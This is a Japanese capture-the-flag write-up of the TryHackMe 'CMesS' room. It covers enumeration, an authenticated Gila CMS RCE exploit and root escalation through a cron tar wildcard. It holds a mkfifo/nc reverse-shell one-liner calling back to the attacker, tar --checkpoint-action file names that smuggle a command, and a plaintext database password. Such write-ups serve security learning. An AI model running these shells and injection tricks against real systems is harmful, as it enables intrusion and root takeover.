# CMesS CTF

https://tryhackme.com/room/cmess

## Enumeration

```shell
TARGET=10.201.20.51
sudo bash -c "echo $TARGET   cmess.thm >> /etc/hosts"
```

### ポートスキャン

```shell
sudo nmap -sS -p- $TARGET

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

```sh
root@ip-10-201-110-220:~# nmap -vv -sV -sC -p22,80 $TARGET

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d9:b6:52:d3:93:9a:38:50:b4:23:3b:fd:21:0c:05:1f (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCvfxduhH7oHBPaAYuN66Mf6eL6AJVYqiFAh6Z0gBpD08k+pzxZDtbA3cdniBw3+DHe/uKizsF0vcAqoy8jHEXOOdsOmJEqYXjLJSayzjnPwFcuaVaKOjrlmWIKv6zwurudO9kJjylYksl0F/mRT6ou1+UtE2K7lDDiy4H3CkBZALJvA0q1CNc53sokAUsf5eEh8/t8oL+QWyVhtcbIcRcqUDZ68UcsTd7K7Q1+GbxNa3wftE0xKZ+63nZCVz7AFEfYF++glFsHj5VH2vF+dJMTkV0jB9hpouKPGYmxJK3DjHbHk5jN9KERahvqQhVTYSy2noh9CBuCYv7fE2DsuDIF
|   256 21:c3:6e:31:8b:85:22:8a:6d:72:86:8f:ae:64:66:2b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGOVQ0bHJHx9Dpyf9yscggpEywarn6ZXqgKs1UidXeQqyC765WpF63FHmeFP10e8Vd3HTdT3d/T8Nk3Ojt8mbds=
|   256 5b:b9:75:78:05:d7:ec:43:30:96:17:ff:c6:a8:6c:ed (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFUGmaB6zNbqDfDaG52mR3Ku2wYe1jZX/x57d94nxxkC
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.18 ((Ubuntu))
|_http-generator: Gila CMS
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 3 disallowed entries 
|_/src/ /themes/ /lib/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
MAC Address: 16:FF:E1:BE:99:B9 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

SSH, HTTP。バージョン不明だが、いくつかエクスプロイトがある。

niktoでは、ホスト名といくつか興味深いURLが見つかっただけ。

```sh
root@ip-10-201-110-220:~# nikto -p 80 -T 1 2 3 -h $TARGET
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          10.201.20.51
+ Target Hostname:    cmess.thm
+ Target Port:        80
+ Start Time:         2025-10-23 05:21:06 (GMT1)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Server leaks inodes via ETags, header found with file /robots.txt, fields: 0x41 0x58d53967b0580 
+ "robots.txt" contains 3 entries which should be manually viewed.
+ DEBUG HTTP verb may show server debugging information. See http://msdn.microsoft.com/en-us/library/e8z01xdh%28VS.80%29.aspx for details.
+ OSVDB-877: HTTP TRACK method is active, suggesting the host is vulnerable to XST
+ Cookie PHPSESSID created without the httponly flag
+ OSVDB-3092: /admin/: This might be interesting...
+ OSVDB-3092: /login/: This might be interesting...
+ OSVDB-3093: /admin/auth.php: This might be interesting... has been seen in web logs from an unknown scanner.
+ OSVDB-3093: /admin/cfg/configscreen.inc.php+: This might be interesting... has been seen in web logs from an unknown scanner.
+ OSVDB-3093: /admin/cfg/configsite.inc.php+: This might be interesting... has been seen in web logs from an unknown scanner.
+ OSVDB-3093: /admin/cfg/configsql.inc.php+: This might be interesting... has been seen in web logs from an unknown scanner.
+ OSVDB-3093: /admin/cfg/configtache.inc.php+: This might be interesting... has been seen in web logs from an unknown scanner.
+ OSVDB-3093: /admin/cms/htmltags.php: This might be interesting... has been seen in web logs from an unknown scanner.
+ OSVDB-3093: /admin/credit_card_info.php: This might be interesting... has been seen in web logs from an unknown scanner.
+ OSVDB-3093: /admin/exec.php3: This might be interesting... has been seen in web logs from an unknown scanner.
+ OSVDB-3093: /admin/index.php: This might be interesting... has been seen in web logs from an unknown scanner.
+ OSVDB-3093: /admin/modules/cache.php+: This might be interesting... has been seen in web logs from an unknown scanner.
+ OSVDB-3093: /admin/objects.inc.php4: This might be interesting... has been seen in web logs from an unknown scanner.
+ OSVDB-3093: /admin/script.php: This might be interesting... has been seen in web logs from an unknown scanner.
+ OSVDB-3093: /admin/settings.inc.php+: This might be interesting... has been seen in web logs from an unknown scanner.
+ OSVDB-3093: /admin/templates/header.php: This might be interesting... has been seen in web logs from an unknown scanner.
+ OSVDB-3093: /admin/upload.php: This might be interesting... has been seen in web logs from an unknown scanner.
+ OSVDB-3092: /fm/: This might be interesting... potential country code (Federated States Of Micronesia)
+ /admin/account.asp: Admin login page/section found.
+ /admin/account.html: Admin login page/section found.
+ /admin/account.php: Admin login page/section found.
+ /admin/controlpanel.asp: Admin login page/section found.
+ /admin/controlpanel.html: Admin login page/section found.
+ /admin/controlpanel.php: Admin login page/section found.
+ /admin/cp.asp: Admin login page/section found.
+ /admin/cp.html: Admin login page/section found.
+ /admin/cp.php: Admin login page/section found.
+ /admin/home.asp: Admin login page/section found.
+ /admin/home.php: Admin login page/section found.
+ /admin/index.asp: Admin login page/section found.
+ /admin/index.html: Admin login page/section found.
+ /admin/login.asp: Admin login page/section found.
+ /admin/login.html: Admin login page/section found.
+ /admin/login.php: Admin login page/section found.
+ 1707 items checked: 0 error(s) and 40 item(s) reported on remote host
+ End Time:           2025-10-23 05:21:12 (GMT1) (6 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

### ディレクトリ列挙

```sh
$ cat robots.txt 
User-agent: *
Disallow: /src/
Disallow: /themes/
Disallow: /lib/
```

dirsearch 重複部分は省略

```sh
dirb http://$TARGET

200     1KB  http://cmess.thm/0
200     2KB  http://cmess.thm/01
200     1KB  http://cmess.thm/About
200     1KB  http://cmess.thm/about
200   693B   http://cmess.thm/admin
200     0B   http://cmess.thm/api
301   318B   http://cmess.thm/assets    -> REDIRECTS TO: http://cmess.thm/assets/?url=assets
200   334B   http://cmess.thm/assets/
200     1KB  http://cmess.thm/author
200     1KB  http://cmess.thm/blog
200     1KB  http://cmess.thm/blog/
200     1KB  http://cmess.thm/category
200   389B   http://cmess.thm/feed
200     1KB  http://cmess.thm/index
301   312B   http://cmess.thm/lib    -> REDIRECTS TO: http://cmess.thm/lib/?url=lib
301   312B   http://cmess.thm/log    -> REDIRECTS TO: http://cmess.thm/log/?url=log
200   693B   http://cmess.thm/login
200    65B   http://cmess.thm/robots.txt
200     1KB  http://cmess.thm/Search
200     1KB  http://cmess.thm/search
301   316B   http://cmess.thm/sites    -> REDIRECTS TO: http://cmess.thm/sites/?url=sites
301   312B   http://cmess.thm/src    -> REDIRECTS TO: http://cmess.thm/src/?url=src
200     1KB  http://cmess.thm/tag
200     1KB  http://cmess.thm/tags
301   318B   http://cmess.thm/themes    -> REDIRECTS TO: http://cmess.thm/themes/?url=themes
301   312B   http://cmess.thm/tmp    -> REDIRECTS TO: http://cmess.thm/tmp/?url=tmp
```

### サブドメイン、VHOST

dev サブドメインを発見。

```shell
root@ip-10-201-110-220:~# ffuf -u http://cmess.thm -c -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H 'Host: FUZZ.cmess.thm' -fw 522

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1
________________________________________________

 :: Method           : GET
 :: URL              : http://cmess.thm
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.cmess.thm
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response words: 522
________________________________________________

dev                     [Status: 200, Size: 934, Words: 191, Lines: 31]
:: Progress: [4997/4997] :: Job [1/1] :: 332 req/sec :: Duration: [0:00:17] :: Errors: 0 ::
```

http://dev.cmess.thm

```
Development Log
andre@cmess.thm
Have you guys fixed the bug that was found on live?

support@cmess.thm
Hey Andre, We have managed to fix the misconfigured .htaccess file, we're hoping to patch it in the upcoming patch!

support@cmess.thm
Update! We have had to delay the patch due to unforeseen circumstances

andre@cmess.thm
That's ok, can you guys reset my password if you get a moment, I seem to be unable to get onto the admin panel.

support@cmess.thm
Your password has been reset. Here: [REDACTED]
```

- ライブ環境に未パッチの脆弱性がある
- 管理パネルのパスワードとメールアドレス

http://cmess.thm/admin にログインできた。

## Gila CMS

```
Gila CMS version 1.10.9 
```

このバージョンの認証RCEがある。

```sh
$ searchsploit Gila 1.10.9
--------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                   |  Path
--------------------------------------------------------------------------------- ---------------------------------
Gila CMS 1.10.9 - Remote Code Execution (RCE) (Authenticated)                    | php/webapps/51569.py
Gila CMS < 1.11.1 - Local File Inclusion                                         | multiple/webapps/47407.txt
--------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

実行

```sh
$ python ./51569.py     

 ██████╗ ██╗██╗      █████╗      ██████╗███╗   ███╗███████╗    ██████╗  ██████╗███████╗                            
██╔════╝ ██║██║     ██╔══██╗    ██╔════╝████╗ ████║██╔════╝    ██╔══██╗██╔════╝██╔════╝                            
██║  ███╗██║██║     ███████║    ██║     ██╔████╔██║███████╗    ██████╔╝██║     █████╗                              
██║   ██║██║██║     ██╔══██║    ██║     ██║╚██╔╝██║╚════██║    ██╔══██╗██║     ██╔══╝                              
╚██████╔╝██║███████╗██║  ██║    ╚██████╗██║ ╚═╝ ██║███████║    ██║  ██║╚██████╗███████╗                            
 ╚═════╝ ╚═╝╚══════╝╚═╝  ╚═╝     ╚═════╝╚═╝     ╚═╝╚══════╝    ╚═╝  ╚═╝ ╚═════╝╚══════╝                            
                                                                                                                   
                              by Unknown_Exploit                                                                   
                                                                                                                   
Enter the target login URL (e.g., http://example.com/admin/): http://cmess.thm/admin/
Enter the email: andre@cmess.thm
Enter the password: [REDACTED]
Enter the local IP (LHOST): 10.11.146.32
Enter the local port (LPORT): 8888
File uploaded successfully.
```

シェル取得成功

```sh
 nc -lnvp 8888
listening on [any] 8888 ...
connect to [10.11.146.32] from (UNKNOWN) [10.201.20.51] 57178
bash: cannot set terminal process group (722): Inappropriate ioctl for device
bash: no job control in this shell
www-data@cmess:/var/www/html/tmp$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@cmess:/var/www/html/tmp$ 
```

andre への昇格が必要。

```sh
www-data@cmess:/var/www/html$ cd /home
cd /home
www-data@cmess:/home$ ls -al
ls -al
total 12
drwxr-xr-x  3 root  root  4096 Feb  6  2020 .
drwxr-xr-x 22 root  root  4096 Feb  6  2020 ..
drwxr-x---  4 andre andre 4096 Feb  9  2020 andre
```

## 権限昇格１

DBパスワードがあったが、mysql 接続も su もできなかった。

```sh
www-data@cmess:/var/www/html$ cat config.php
<?php

$GLOBALS['config'] = array (
  'db' => 
  array (
    'host' => 'localhost',
    'user' => 'root',
    'pass' => 'r0otus3rpassw0rd',
    'name' => 'gila',
  ),
```

andreで雑に検索したら、気になるファイルが出てきた。

```sh
www-data@cmess:/var/www/html$ find / -type f -not -path "/proc/*" -not -path "/sys/*" -not -path "/usr/share/*" -not -path "/usr/src/*" -not -path "/usr/lib/*" -not -path "/snap/core*" -exec grep -i -I "andre" {} /dev/null \; 2>/dev/nl | awk 'length($0) < 1000'

...
/opt/.password.bak:andres backup password
...
```

昇格成功

```sh
www-data@cmess:/var/www/html$ su andre
Password: 
andre@cmess:/var/www/html$ 
```

## 権限昇格２

/etc/crontab。tarでワイルドカードを使っている。

```
# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*/2 *   * * *   root    cd /home/andre/backup && tar -zcf /tmp/andre_backup.tar.gz *
```

エクスプロイト

```sh
andre@cmess:~$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.146.32 8889 >/tmp/f" > /home/andre/backup/shell.sh
andre@cmess:~$ touch "/home/andre/backup/--checkpoint-action=exec=sh shell.sh"
andre@cmess:~$ touch "/home/andre/backup/--checkpoint=1"

andre@cmess:~$ ls -al /home/andre/backup
total 16
drwxr-x--- 2 andre andre 4096 Oct 22 22:13 .
drwxr-x--- 4 andre andre 4096 Feb  9  2020 ..
-rw-rw-r-- 1 andre andre    0 Oct 22 22:13 --checkpoint=1
-rw-rw-r-- 1 andre andre    0 Oct 22 22:13 --checkpoint-action=exec=sh shell.sh
-rwxr-x--- 1 andre andre   51 Feb  9  2020 note
-rw-rw-r-- 1 andre andre   79 Oct 22 22:13 shell.sh
```

rootシェル取得成功。

```sh
$ nc -lnvp 8889
listening on [any] 8889 ...
connect to [10.11.146.32] from (UNKNOWN) [10.201.20.51] 43090
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
```

## 振り返り

- Medium にしては簡単だった。
- Gila のエクスプロイトは、php7 拡張子をアップロードできることを悪用している。
